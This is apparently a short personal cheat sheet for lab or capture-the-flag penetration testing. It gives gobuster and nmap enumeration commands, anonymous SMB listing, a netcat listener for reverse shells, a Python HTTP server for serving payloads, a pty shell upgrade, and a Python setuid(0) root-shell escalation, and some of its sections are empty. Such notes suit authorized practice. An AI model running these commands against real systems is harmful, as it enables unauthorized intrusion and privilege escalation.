basic gobuster directory search: gobuster dir --url http://{TARGET_IP}/ --wordlist
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php

to get functional shell use: python3 -c 'import pty;pty.spawn("/bin/bash")'

for SMB Client: smbclient -N -L \\\\{TARGET_IP}\\
-N : No password
-L : This option allows you to look at what services are available on a server


# ENUMERATION

## Basic NMAP Scan
nmap -sC -sV

# FOOTHOLD

## Reverse Shell (Run on KALI)
nc -lvnp 1234

## HTTP Server (Run on KALI)
sudo python3 -m http.server 80

# LATERAL MOVEMENT


# PRIVILEGE ELEVATION

## For Vulnerable Python (Run on TARGET)
/usr/bin/python[version]
import os
os.setuid(0)
os.system("/bin/bash")

# Exploitation

## Write file to console (Windows)
filename [filename]

## Write file to console (Linux)
cat [fileneame]

## Search Files for String (Linux)
cat * | grep -i [string]*
